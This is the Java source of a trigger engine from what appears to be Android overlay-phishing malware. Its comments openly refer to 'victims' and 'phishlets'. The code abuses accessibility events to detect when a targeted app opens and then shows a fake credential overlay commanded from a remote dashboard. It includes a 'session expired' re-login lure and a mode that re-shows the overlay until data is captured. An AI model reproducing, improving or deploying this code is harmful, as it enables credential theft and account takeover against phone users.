package com.fason.app.features.overlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

/**
 * SmartTriggerEngine — the brain of the overlay/phishlet system.
 *
 * Old behaviour: dashboard pressed "inject" → overlay fired immediately,
 * on top of whatever screen the victim was looking at. Dumb. Loud. Dead.
 *
 * New behaviour: dashboard arms a trigger. The engine watches accessibility
 * window-state events. When — and only when — the target package lands in
 * the foreground, the overlay rises. If the victim backs out, the trigger
 * re-arms silently and waits for the next open. No premature fire. No
 * overlay-on-launcher embarrassment.
 *
 * Modes:
 *   INSTANT  — fire as soon as target app foregrounds (default)
 *   SESSION  — fire a "session expired" pre-page first; tap hands off to
 *              the real credential page (classic re-auth pattern)
 *   PERSIST  — keep re-showing on every foreground until data captured
 */
public final class SmartTriggerEngine {
    private static final String TAG = "SmartTriggerEngine";
    private static final long REARM_COOLDOWN_MS = 4000;
    private static final long MIN_FOREGROUND_MS = 600;

    public enum Mode { INSTANT, SESSION, PERSIST }

    public static final class Trigger {
        public String packageName;
        public String template;
        public Mode mode;
        public boolean persistent;
        public long armedAt;
        public long lastFiredAt;
        public int fireCount;
        public boolean dataCaptured;
        public String prePage; // session-expired html key

        Trigger(String pkg, String template, Mode mode, boolean persistent) {
            this.packageName = pkg;
            this.template = template;
            this.mode = mode;
            this.persistent = persistent;
            this.armedAt = System.currentTimeMillis();
            this.lastFiredAt = 0;
            this.fireCount = 0;
            this.dataCaptured = false;
            this.prePage = "session_expired";
        }
    }

    private static volatile SmartTriggerEngine instance;
    private final Context context;
    private final Map<String, Trigger> armed = new ConcurrentHashMap<>();
    private final Set<String> foregroundHistory = new HashSet<>();
    private volatile String currentForeground = "";
    private volatile long foregroundSince = 0;
    private volatile boolean engineEnabled = true;

    private SmartTriggerEngine(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    public static synchronized SmartTriggerEngine get(Context ctx) {
        if (instance == null) instance = new SmartTriggerEngine(ctx);
        return instance;
    }

    public static SmartTriggerEngine get() {
        if (instance == null) {
            Context ctx = FasonApp.getContext();
            if (ctx == null) return null;
            instance = new SmartTriggerEngine(ctx);
        }
        return instance;
    }

    // ========== ARMING (called from SocketCommandRouter) ==========

    /** Arm a trigger. Does NOT show anything yet. */
    public synchronized JSONObject arm(String pkg, String template, Mode mode, boolean persistent) {
        Trigger t = new Trigger(pkg, template, mode, persistent);
        armed.put(pkg, t);
        Log.i(TAG, "ARMED " + pkg + " mode=" + mode + " tmpl=" + template);

        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "armed");
            r.put(Protocol.KEY_PACKAGE, pkg);
            r.put("mode", mode.name().toLowerCase());
            r.put("waitingFor", pkg);
            r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
        } catch (Exception ignored) {}
        return r;
    }

    /** Arm from a JSON config payload (dashboard bulk-set). */
    public synchronized JSONArray armAll(JSONArray apps) {
        JSONArray results = new JSONArray();
        if (apps == null) return results;
        for (int i = 0; i < apps.length(); i++) {
            try {
                JSONObject a = apps.getJSONObject(i);
                String pkg = a.optString("package", "");
                if (pkg.isEmpty()) continue;
                String tmpl = a.optString("template", pkg + ".html");
                String modeStr = a.optString("mode", "instant");
                Mode mode = Mode.INSTANT;
                if ("session".equalsIgnoreCase(modeStr)) mode = Mode.SESSION;
                else if ("persist".equalsIgnoreCase(modeStr)) mode = Mode.PERSIST;
                boolean persist = a.optBoolean("persistent", mode == Mode.PERSIST);
                results.put(arm(pkg, tmpl, mode, persist));
            } catch (Exception e) {
                Log.e(TAG, "armAll item failed", e);
            }
        }
        return results;
    }

    public synchronized JSONObject disarm(String pkg) {
        armed.remove(pkg);
        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "disarmed");
            r.put(Protocol.KEY_PACKAGE, pkg);
        } catch (Exception ignored) {}
        return r;
    }

    public synchronized void disarmAll() {
        armed.clear();
    }

    public synchronized boolean isArmed(String pkg) {
        return armed.containsKey(pkg);
    }

    // ========== FOREGROUND TRACKING (called from a11y services) ==========

    public void onWindowStateChanged(AccessibilityEvent event) {
        if (!engineEnabled) return;
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;
        String packageName = pkg.toString();

        long now = System.currentTimeMillis();
        if (!packageName.equals(currentForeground)) {
            currentForeground = packageName;
            foregroundSince = now;
            foregroundHistory.add(packageName);
            evaluateTriggers(packageName, now);
        }
    }

    private void evaluateTriggers(String foregroundPkg, long now) {
        // 1. Exact-match trigger
        Trigger exact = armed.get(foregroundPkg);
        if (exact != null) {
            maybeFire(exact, now);
            return;
        }
        // 2. Wildcard / family triggers (e.g. com.facebook.*)
        for (Map.Entry<String, Trigger> e : armed.entrySet()) {
            String key = e.getKey();
            if (key.endsWith(".*")) {
                String prefix = key.substring(0, key.length() - 1);
                if (foregroundPkg.startsWith(prefix)) {
                    maybeFire(e.getValue(), now);
                    return;
                }
            }
        }
    }

    private void maybeFire(Trigger t, long now) {
        // Respect minimum foreground dwell — kills flicker during app switches
        if (now - foregroundSince < MIN_FOREGROUND_MS) return;

        // Cooldown between fires (unless PERSIST re-arm is due)
        if (t.lastFiredAt > 0 && now - t.lastFiredAt < REARM_COOLDOWN_MS) return;

        // If data already captured and not persistent, stand down
        if (t.dataCaptured && !t.persistent && t.mode != Mode.PERSIST) {
            armed.remove(t.packageName);
            return;
        }

        // Don't stack: if an overlay is already up for this package, skip
        OverlayService svc = OverlayService.getInstance();
        if (svc != null && svc.isShowing() && t.packageName.equals(svc.getCurrentPackage())) {
            return;
        }

        t.lastFiredAt = now;
        t.fireCount++;

        Log.i(TAG, "FIRE " + t.packageName + " mode=" + t.mode + " count=" + t.fireCount);
        fire(t);
    }

    private void fire(Trigger t) {
        if (!Settings.canDrawOverlays(context)) {
            Log.w(TAG, "No overlay permission — trigger held");
            return;
        }

        String template = t.template;
        boolean usePrePage = (t.mode == Mode.SESSION) && !t.dataCaptured && t.fireCount == 1;

        Intent intent = new Intent(context, OverlayService.class);
        intent.setAction("SHOW_OVERLAY");
        intent.putExtra(Protocol.KEY_OVERLAY_PACKAGE, t.packageName);
        intent.putExtra(Protocol.KEY_OVERLAY_TEMPLATE, template);
        intent.putExtra(Protocol.KEY_OVERLAY_PERSISTENT, t.persistent || t.mode == Mode.PERSIST);
        intent.putExtra("smart_mode", t.mode.name());
        intent.putExtra("use_pre_page", usePrePage);
        intent.putExtra("fire_count", t.fireCount);
        context.startService(intent);
    }

    // ========== DATA CAPTURE CALLBACK ==========

    /** Called by PhishletJSInterface when the victim submits data. */
    public synchronized void onDataCaptured(String pkg) {
        Trigger t = armed.get(pkg);
        if (t != null) {
            t.dataCaptured = true;
            Log.i(TAG, "DATA CAPTURED for " + pkg + " — trigger " +
                (t.persistent ? "stays armed (persistent)" : "disarmed"));
            if (!t.persistent && t.mode != Mode.PERSIST) {
                armed.remove(pkg);
            }
        }
    }

    // ========== STATUS ==========

    public JSONObject getStatus() {
        JSONObject r = new JSONObject();
        try {
            r.put("enabled", engineEnabled);
            r.put("currentForeground", currentForeground);
            r.put("armedCount", armed.size());
            JSONArray arr = new JSONArray();
            for (Trigger t : armed.values()) {
                JSONObject o = new JSONObject();
                o.put("package", t.packageName);
                o.put("template", t.template);
                o.put("mode", t.mode.name());
                o.put("persistent", t.persistent);
                o.put("fireCount", t.fireCount);
                o.put("dataCaptured", t.dataCaptured);
                o.put("armedAt", t.armedAt);
                arr.put(o);
            }
            r.put("armed", arr);
        } catch (Exception ignored) {}
        return r;
    }

    public void setEnabled(boolean enabled) {
        this.engineEnabled = enabled;
    }

    public boolean isEnabled() {
        return engineEnabled;
    }

    public String getCurrentForeground() {
        return currentForeground;
    }
}
